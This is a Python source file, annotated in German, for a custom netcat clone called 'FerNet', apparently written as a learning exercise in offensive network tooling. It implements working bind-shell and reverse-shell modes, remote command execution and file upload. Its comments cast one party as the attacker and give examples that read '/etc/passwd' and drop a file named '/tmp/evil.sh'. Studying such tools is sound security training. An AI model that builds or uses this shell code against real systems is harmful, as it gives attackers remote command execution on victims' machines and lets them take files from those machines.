# =============================================================================
# CUSTOM NETCAT (FerNet.py)
# =============================================================================
#
# Funktion: Daten über Netzwerk lesen/schreiben
#
#   ┌─────────────────────────────────────────────────────┐
#   │                    FerNet-Klasse                    │
#   │                                                     │
#   │  __init__()  -> Socket erstellen, Args speichern    │
#   │  run()       -> Entscheidet: listen() oder send()   │
#   │  send()      -> Client-Modus: verbinden & senden    │
#   │  listen()    -> Server-Modus: warten auf Clients    │
#   │  handle()    -> Pro Client: command/upload/shell    │
#   │  # Hilfsfunktionen                                  │
#   │  execute()   -> Befehl ausführen, Output zurück     │
#   └─────────────────────────────────────────────────────┘
#
#   -c  = Interaktive Command Shell (ohne Verschlüsselung)
#   -e  = Einzelnen Befehl ausführen
#   -u  = Datei-Upload (empfängt Daten und schreibt sie in eine Datei)
#   -l  = Listener-Modus (Server-Seite)
#   -t  = Ziel-IP
#   -p  = Ziel-Port
#
# BEISPIEL-SZENARIEN (Bind-Shell):
#   Bob (Zielhost stellt Shell bereit): python FerNet.py -t 10.0.0.5 -p 5555 -l -c
#   Alice (Angreifer):                  python FerNet.py -t 10.0.0.5 -p 5555
#   -> Alice verbindet sich zu Bob, bekommt Prompt "#> ", tippt Befehle, Bob führt sie aus und sendet Output zurück

import argparse
import shlex
import socket
import subprocess
import sys
import textwrap
import threading

def execute(command):
    """"
    Führt einen Befehl in der Shell aus und gibt die Ausgabe zurück.

    subprocess-Modul: Ermöglicht das Ausführen von Systembefehlen aus Python heraus.
    $ls -la im Terminal -> subprocess.run(["ls", "-la"])
    subprocess.check_output():
      - Führt den Befehl aus
      - Wartet bis er fertig ist
      - Gibt stdout als bytes zurück
      - Wirft eine Exception bei Fehler (returncode != 0)

    shlex.split():
    zerlegt Command-String in Liste:
        "ls -la /tmp" -> ["ls", "-la", "/tmp"]
    Sonderfälle wie Quotes werden korrekt behandelt:
        'echo "hello world"' -> ["echo", "hello world"]
    """
    cmd = command.strip() # Entfernt führende/folgenden Whitespace (Leerzeichen, Tabs, Newlines)
    if not cmd: #prüft, ob cmd leer ist (z.B. nur Enter gedrückt)
        return "" # Leerer Befehl, nichts ausführen
    
    # stderr=subprocess.STDOUT -> Fehlermeldungen werden mit in stdout gepackt -> Alle Ausgaben (Erfolg + Fehler) kommen zurück

    try:
        output = subprocess.check_output(
            shlex.split(cmd), # Zerlegt den Command-String in eine Liste von Argumenten
            stderr=subprocess.STDOUT, # Standard Error -> STDOUT: Fehler werden in die Standardausgabe umgeleitet
        )
        return output.decode("utf-8") # Bytes -> String (UTF-8)

    except FileNotFoundError:
        return f"[!] Befehl nicht gefunden: '{cmd}' (kein Executable - CMD built-ins via 'cmd /c {cmd}')\n"
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8")  # Fehlermeldung des Befehls zurückgeben

class FerNet:
    """
    Client-Modus (send) oder Server-Modus (listen)

    Als CLIENT:
        - Verbindet sich zum Ziel
        - Empfängt Antworten und erlaubt interaktive Eingabe

    Als SERVER (Listener):
        - Wartet auf eingehende Verbindungen
        - Je nach Modus: Shell bereitstellen, Befehl ausführen, oder Datei empfangen
    """

    def __init__(self, args):
        """
        Initialisierung: Args speichern, Socket erstellen.

        args:   Die geparsten Kommandozeilen-Argumente (argparse Namespace)
        """
        
        self.args = args

        # TCP Socket erstellen
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # SO_REUSEADDR = Port sofort wiederverwendbar nach Programmende
        # Ohne diese Option: "Address already in use" Fehler beim Neustart,
        # weil das OS den Port noch für ~60 Sekunden im TIME_WAIT hält
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        """
        Enrtry Point: Entscheidet basierend auf den Argumenten, ob im Listen- oder Send-Modus gestartet wird -> -l Flag
        """    
        if self.args.listen:
            self.listen() # Server-Modus: Auf Verbindungsanfragen warten
        else:
            self.send() # Client-Modus: Verbinden und Daten senden

    # -------------------------------------------------------------------------
    # CLIENT-MODUS: Verbinden, Daten senden, interaktiv kommunizieren
    # -------------------------------------------------------------------------
    def send(self):
        """
        Client-Modus: Verbindet sich zum Ziel

        Ablauf:
          1. Verbindung aufbauen
          3. Endlosschleife: Empfangen -> Anzeigen -> Eingabe -> Senden
          4. CTRL-C zum Beenden
        """

        # 1. Verbindung aufbauen
        self.socket.connect((self.args.target, self.args.port))
        print(f"[*] Connected to {self.args.target}:{self.args.port}")

        # ----- MODUS FILE: Datei-Upload -----
        if self.args.file:
            # Dateiinhalt lesen und senden
            with open(self.args.file, "rb") as f:
                data = f.read()
            self.socket.send(data) # Dateiinhalt als Bytes senden
            self.socket.shutdown(socket.SHUT_WR) # EOF signalisieren: "Ich sende nichts mehr" -> Server beendet Empfangsschleife
            print(f"[*] Sent file {self.args.file}")

        # ----- MODUS REVERSE: Interaktive Reverse Shell -----
        if self.args.reverse: # Befehle vom Server empfangen, ausführen, Output zurückschicken --> Reverse Shell
            # try ... except KeyboardInterrupt: sauberes Beenden mit CTRL-C
            try: 
                while True:
                    cmd_buffer = b""
                    # Warten bis kompletter Befehl (Newline = Enter)
                    while b"\n" not in cmd_buffer:
                        cmd_buffer += self.socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        self.socket.send(response.encode())

            # CTRL-C abfangen -> Verbindung schließen
            except KeyboardInterrupt:
                print("\n[*] Interrupt received, closing connection...")
                self.socket.close() # Verbindung schließen
                sys.exit() # Programm beenden, exit code 0 (Erfolg)
            
        # Standard-Modus: Empfangen -> Anzeigen -> Eingabe -> Senden
        # try ... except KeyboardInterrupt: sauberes Beenden mit CTRL-C
        try:
            while True:
                # Empfangen
                response = self.socket.recv(4096) # Blockiert bis Daten empfangen wurden
                
                # Empfangene Daten anzeigen und auf neue Eingabe warten
                if response:
                    print(response.decode("utf-8"), end="") # Bytes -> String, end="" verhindert doppeltes Newline
                    cmd_buffer = input() # Buffer fuer Eingabe vom Benutzer (Command)
                    cmd_buffer += "\n" # Zeilenumbruch hinzufügen, damit der Befehl ausgeführt wird
                    self.socket.send(cmd_buffer.encode("utf-8")) # String -> Bytes

        # CTRL-C abfangen -> Verbindung schließen
        except KeyboardInterrupt:
            print("\n[*] Interrupt received, closing connection...")
            self.socket.close() # Verbindung schließen
            sys.exit() # Programm beenden, exit code 0 (Erfolg)

    # -------------------------------------------------------------------------
    # SERVER-MODUS: Auf Verbindungen warten und Clients behandeln
    # -------------------------------------------------------------------------
    def listen(self):
        """
        Server-Modus: Bindet an die Ziel-IP und Port, wartet auf Verbindungsanfragen und startet für jeden Client einen neuen Thread.

        Ablauf:
          1. Socket binden (bind)
          2. Auf Verbindungsanfragen warten (listen)
          3. Bei Verbindung: Neuen Thread starten, um Client zu bedienen (handle)
        """

        # 1. Socket binden (bind)
        self.socket.bind((self.args.target, self.args.port))
        print(f"[*] Listening on {self.args.target}:{self.args.port}")

        # 2. Auf Verbindungsanfragen warten (listen)
        self.socket.listen() # Erstellt Warteschlange für Verbindungsanfragen im OS-Kernel
        print(f"[*] Waiting for incoming connections...")

        # 3. Bei Verbindung: Neuen Thread starten, um Client zu bedienen (handle)
        while True:
            client_socket, addr = self.socket.accept() # Blockiert bis ein Client sich verbindet -> (socket, (IP, Port))
            print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
            # Neuen Thread starten, um Client zu bedienen
            client_handler = threading.Thread(
                target = self.handle, # Funktion, die im Thread ausgeführt wird
                args = (client_socket,) # Argumente für die Funktion (hier: der Socket des Clients)
            )
            client_handler.start()


    def handle(self, client_socket):
        """
        Verarbeitet einen verbundenen Client je nach gewähltem Modus.

        Drei Modi sind möglich (sich gegenseitig ausschließend):

        1. EXECUTE (-e): Führt einen einzelnen Befehl aus, sendet Output zurück
           Beispiel: -e "cat /etc/passwd"
           -> Client verbindet sich, bekommt sofort den Dateiinhalt

        2. UPLOAD (-u): Empfängt Daten vom Client und schreibt sie in eine Datei
           Beispiel: -u /tmp/evil.sh
           -> Client sendet Dateiinhalt, Server speichert ihn

        3. COMMAND SHELL (-c): Interaktive Shell wie bei SSH
           -> Server sendet Prompt "#> "
           -> Client tippt Befehle
           -> Server führt aus und sendet Output zurück
           -> Wiederholen bis "exit" oder Fehler
        """

        # ----- MODUS EXECUTE: Einzelnen Befehl ausführen -----
        if self.args.execute: # EXECUTE-MODUS
            output = execute(self.args.execute) # Befehl ausführen und Output zurückbekommen
            client_socket.send(output.encode("utf-8")) # Output an Client senden (String -> Bytes)

        # ----- MODUS UPLOAD: Datei empfangen und speichern -----
        elif self.args.upload: # UPLOAD-MODUS
            file_buffer = b"" # Buffer für empfangene Dateidaten

            # Daten empfangen, bis der Client die Verbindung schließt
            while True:
                data = client_socket.recv(1024) # Blockiert bis Daten empfangen wurden
                if data:
                    file_buffer += data # Empfangene Daten zum Buffer hinzufügen
                else:
                    break # Verbindung geschlossen, Empfang beenden

            # Empfangene Daten in Datei schreiben
            with open(self.args.upload, "wb") as f: # "wb" = write binary
                f.write(file_buffer) # Buffer in Datei schreiben
            print(f"[*] Saved file {self.args.upload}") # Server-seitige Bestätigung in Konsole
            message = f"[*] Saved file {self.args.upload}" # Bestätigungsmeldung an Client
            client_socket.send(message.encode())

        # ----- MODUS COMMAND SHELL: Interaktive Bind Shell -----
        # Client schickt Befehl -> Server: execute(cmd) -> send(output) : Client empfängt output
        elif self.args.command: # COMMAND SHELL-MODUS
            cmd_buffer = b"" # Buffer für empfangene Befehle

            while True:
                try:
                    # Prompt senden
                    client_socket.send(b"ServerPrompt> ")

                    # Eingabe empfangen bis ein Newline kommt
                    # Befehl erst komplett, wenn Enter gedrückt -> \n
                    while b"\n" not in cmd_buffer:
                        # Empfängt Daten und fügt sie zum Buffer hinzu
                        # kleine Schritte (64 Bytes), weil auf einzelnes Newline gewartet wird
                        cmd_buffer += client_socket.recv(64)

                    # Befehl ausführen
                    response = execute(cmd_buffer.decode("utf-8")) # Bytes -> String, Befehl ausführen, Output zurückbekommen    
                    if response: # Nur senden, wenn es eine Antwort gibt
                        client_socket.send(response.encode("utf-8")) # Output an Client senden (String -> Bytes)

                    # Buffer zurücksetzen für nächsten Befehl
                    cmd_buffer = b""

                except Exception as e:
                    print(f"[*] Exception: {e}")
                    client_socket.close() # Client-Verbindung schließen (nicht den Server-Socket!)
                    print(f"[*] Connection closed with error: {e}")
                    sys.exit(1) # Programm beenden mit Fehlercode 1 (Fehler)


        # ----- MODUS REVERSE: Interaktive Reverse Shell -----
        # Server schickt Befehl -> Client: execute(cmd) -> send(output) : Server empfängt output
        elif self.args.reverse:
            # Client hat sich mit Shell verbunden - Server tippt Befehle, Client führt sie aus und sendet Output zurück -> Reverse Shell
            while True:
                client_socket.send(b"RevShell> ")
                cmd = input("R#> ") + '\n'
                client_socket.send(cmd.encode())
                response = client_socket.recv(4096)
                print(response.decode())
            

# =============================================================================
# KOMMANDOZEILEN-INTERFACE
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="FerNet - A Networking Tool for Reading/Writing over TCP",
        # RawDescriptionHelpFormatter bewahrt Formatierung im Epilog
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
        ========== BEISPIELE ==========

        Einzelne Befehle ausführen (Server):                       
            Server: > python Network.py -t 0.0.0.0 -p 4444 -l -e "whoami"
            Client: > python Network.py -t 127.0.0.1 -p 4444                                 

        Bind-Shell (Server führt Befehle aus):
            Server: > python FerNet.py -t 127.0.0.1 -p 4554 -l -c
            Client: > python FerNet.py -t 127.0.0.1 -p 4554 -c

        Reverse-Shell (Client führt Befehle aus):                               
            Server: > python FerNet.py -t
            Client: > python FerNet.py -t                                                

        Datei-Upload
            Server (Empfänger): > python Network.py -t 0.0.0.0 -p 4444 -l -u outfile.txt
            Client (Sender):    > python Network.py -t 127.0.0.1 -p 4444 -f infile.txt

                               
        Text an Server senden (Client-Seite):
            echo 'ABC' | python chapter02_basic_networking.py -t 192.168.1.108 -p 135

        Einfach verbinden:
            python chapter02_basic_networking.py -t 192.168.1.108 -p 5555
        ''')
    )

    # action='store_true' = Flag ohne Wert (da/nicht da = True/False)
    parser.add_argument('-c', '--command',
                        action='store_true',
                        help='Interaktive Command Shell starten') # -> args.command

    parser.add_argument('-e', '--execute',
                        help='Einen bestimmten Befehl ausführen') # -> args.execute

    parser.add_argument('-l', '--listen',
                        action='store_true',
                        help='Als Listener (Server) starten') # -> args.listen

    parser.add_argument('-p', '--port',
                        type=int,
                        default=4554,
                        help='Port (Standard: 4554') # -> args.port

    parser.add_argument('-t', '--target',
                        default='0.0.0.0',
                        help='Ziel-IP (Standard: 0.0.0.0)') # -> args.target

    parser.add_argument('-u', '--upload',
                        help='Datei-Upload: Pfad der Zieldatei (Download)') # -> args.upload
    
    parser.add_argument('-f', '--file',
                        help='Datei-Upload: Inhalt zum Speichern in einer Datei (Upload)') # -> args.reverse
    
    parser.add_argument('-r', '--reverse',
                        action='store_true',
                        help='Reverse Shell: Client bietet Shell an') # -> args.reverse

    args = parser.parse_args() # Erstellt Namespace mit Argumenten
    # Beispiel-Terminal-Eingabe:
    # python FerNet.py -t 192.168.1.1 -p 8080 -l
    # args.target   # → '192.168.1.1'
    # args.port     # → 8080
    # args.listen   # → True
    # args.execute  # → None  (nicht angegeben)
    # args.upload   # → None
    # args.reverse  # → None
    # args.file     # → None
    # args.command  # → False

    # NetCat-Objekt erstellen und starten
    fn = FerNet(args)
    fn.run()